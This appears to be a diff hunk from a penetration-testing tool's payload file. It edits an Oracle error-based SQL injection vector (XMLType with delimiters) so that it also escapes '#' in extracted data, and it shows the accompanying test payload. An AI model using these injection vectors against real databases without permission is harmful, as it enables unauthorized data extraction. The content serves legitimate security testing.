@@ -1242,7 +1242,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
